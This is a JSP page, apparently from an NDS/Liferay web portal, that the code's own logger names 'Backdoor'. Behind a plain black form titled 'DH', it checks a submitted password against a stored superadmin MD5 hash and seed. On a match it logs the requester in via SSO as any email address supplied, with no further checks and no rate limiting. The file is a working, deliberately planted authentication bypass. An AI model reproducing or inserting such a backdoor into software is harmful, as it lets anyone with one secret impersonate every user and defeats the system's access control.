<%@page errorPage="/html/nds/error.jsp"%>
<%@ include file="/html/nds/common/init.jsp" %>
<%!
private nds.log.Logger logger= nds.log.LoggerManager.getInstance().getLogger("Backdoor");
%>
<%
/**
 check superadmin's password with ad_sysconf setting, if ok, will login as specified user
*/
String email=request.getParameter("email");
String pwd=request.getParameter("pwd");
if(!nds.util.Validator.isNull(email) && !nds.util.Validator.isNull(pwd)){
	// check pwd
	String pwdHash=(String)QueryEngine.getInstance().doQueryOne("select value from ad_sysconf where name='security.superadmin.passwordhash'");
	String seed=(String)QueryEngine.getInstance().doQueryOne("select value from ad_sysconf where name='security.superadmin.seed'");
	if(seed!=null && pwdHash!=null && nds.util.MD5Sum.toCheckSumStr(seed+pwd).equals(pwdHash)){
		com.liferay.portal.action.LoginAction.loginSSOUser(request, response, email);
		logger.info("Backdoor is opened for "+ email+" from "+ request.getRemoteAddr());
		response.sendRedirect("/html/nds/portal/index.jsp");
		return;
	}
	logger.info("Backdoor is rejected from "+ request.getRemoteAddr());
}
%>
<html>
<head>
<title>DH</title>
<style>
	.f{color:#FFFFFF;
	width:80px;
	}
	.i{
	 width:160px;
	 
	}
	#horizon        
	{
	text-align: center;
	position: absolute;
	top: 50%;
	left: 0px;
	width: 100%;
	height: 1px;
	overflow: visible;
	display: block
	}
#content    
	{
	width: 250px;
	height: 70px;
	margin-left: -125px;
	position: absolute;
	top: -35px;
	left: 50%;
	visibility: visible
	}

</style>	
</head>
<body bgcolor="black">
	<div id="horizon">
   <div id="content">
		<form method="post" action="dh.jsp">
			<span class="f">Email:</span><input class="i" type="text" name="email" value=""><br><br>
			<span class="f">Paswd:</span><input class="i" type="password" name="pwd" value=""><br><br>
			<input type="submit" value="Submit">
		</form>
	</div><!-- closes content-->
</div><!-- closes horizon-->

			
</body>
</html>

